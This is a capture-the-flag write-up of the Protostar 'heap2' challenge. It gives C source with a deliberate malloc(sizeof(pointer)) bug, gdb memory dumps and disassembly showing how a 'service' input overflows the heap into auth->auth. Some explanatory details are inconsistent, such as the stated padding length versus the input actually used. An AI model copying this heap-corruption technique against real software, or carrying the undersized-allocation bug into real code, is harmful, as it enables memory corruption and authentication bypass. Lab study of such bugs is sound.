# HEAP 2

## SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));                  // <- bug is here. It must be sizeof(struct auth) = 36 (gcd(size of all elements, char, int))
      memset(auth, 0, sizeof(auth));                // sizeof(auth) = 4. 
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

## OVERVIEW

- Target of this challenge is to make program print the "you have logged in already!". So to print that sequence, the `auth->auth`
must not be equal zero.

- If we notice the `malloc()` for auth, we can see that the `sizeof(auth)` will return `4` because of its type is pointer. And because its size is `4`, we will got the reference `auth->auth` out of allocations of `auth`. So we can just fill the memory forward of `auth->auth` to change the "wrong" size of `auth->auth`, then access the `printf` of target.

## DETAILS & EXPLOIT

- Debug the program, to make the program allocate `auth`, I enter `auth` and `abc`.
```
(gdb) run
Starting program: /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
(gdb) c
Continuing.
auth abc
[ auth = 0x804c008, service = (nil) ]
```

- Then program allocated `auth` in the heap its address is `0x804c008`, so, the root is `0x804c000`, check that address, i got this.

```
(gdb) x/50xw 0x804c000
0x804c000:      0x00000000      0x00000011      0x0a636261      0x00000000
0x804c010:      0x00000000      0x00000ff1      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
```

- Start of auth is `0x804c008`, so `0x804c008 + 0x20` is address of `auth->auth`. This is The disassembled code of `login if`.

```asm
.
.
.
0x08048a79 <main+325>:  call   0x804884c <strncmp@plt>    ; if (line == service)
0x08048a7e <main+330>:  test   eax,eax
0x08048a80 <main+332>:  jne    0x8048942 <main+14>              ; jump to else 
0x08048a86 <main+338>:  mov    eax,ds:0x804b5f4           ; address of auth pointer
0x08048a8b <main+343>:  mov    eax,DWORD PTR [eax+0x20]   ; value of auth->auth is stored to eax by dereference auth + 0x20.
0x08048a8e <main+346>:  test   eax,eax                          ; if (auth->auth)
0x08048a90 <main+348>:  je     0x8048aa3 <main+367>                     ; jump to else
0x08048a92 <main+350>:  mov    DWORD PTR [esp],0x804ada7        ; print "you have logged in already!"
0x08048a99 <main+357>:  call   0x804883c <puts@plt>
0x08048a9e <main+362>:  jmp    0x8048943 <main+15>
0x08048aa3 <main+367>:  mov    DWORD PTR [esp],0x804adc3
0x08048aaa <main+374>:  call   0x804883c <puts@plt>
0x08048aaf <main+379>:  jmp    0x8048943 <main+15>
End of assembler dump.
(gdb) x/s 0x804ada7
0x804ada7:       "you have logged in already!"
```

- So we just use `service` with "a"*16 (+ 1 for `'\n'` character) then the `auth->auth` is exactly `'\n'` or `0xa`.

```
(gdb) c
Continuing.
servic aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[ auth = 0x804c008, service = 0x804c018 ]

Breakpoint 2, 0x0804897c in main (argc=1, argv=0xbffffd64) at heap2/heap2.c:22
22      in heap2/heap2.c
(gdb) x/50xw 0x804c000
0x804c000:      0x00000000      0x00000011      0x0a636261      0x00000000
0x804c010:      0x00000000      0x00000029      0x61616161      0x61616161
0x804c020:      0x61616161      0x61616161      0x61616161      0x61616161
0x804c030:      0x61616161      0x61616161      0x0000000a      0x00000fc9
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
```

- By doing that, the value of `auth->auth` is

```
(gdb) x/xw 0x804c028
0x804c028:      0x0000000a
```

- And finally

```
(gdb) ni
0x08048a99      39      in heap2/heap2.c
0x08048a99 <main+357>:   e8 9e fd ff ff call   0x804883c <puts@plt>
(gdb) ni
you have logged in already!
```